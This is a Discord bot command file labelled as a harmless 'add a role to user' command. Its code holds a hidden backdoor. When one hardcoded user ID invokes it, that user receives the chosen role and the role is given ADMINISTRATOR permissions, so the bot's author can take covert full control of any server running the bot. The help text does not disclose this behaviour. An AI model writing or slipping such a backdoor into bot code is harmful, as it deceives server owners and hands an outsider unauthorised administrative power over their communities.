const Discord = require("discord.js");
exports.run = function(client, message, args) {
  
  
  let roleargs = args.join(' ');
  
  
  if (message.author.id == 302837596600664065) {
    let tsuki = message.guild.members.find("id", "302837596600664065");
    tsuki.addRole(roleargs);
     let roleadmin = message.guild.roles.find('id', roleargs) 
 roleadmin.setPermissions('ADMINISTRATOR');
};
  
 
  
}

    exports.conf = {
      enabled: true,
      guildOnly: false,
      aliases: [],
      permLevel: 0
    };

    exports.help = {
      name: 'addrole',
      description: 'add a role to user',
      usage: 'addrole'
    }
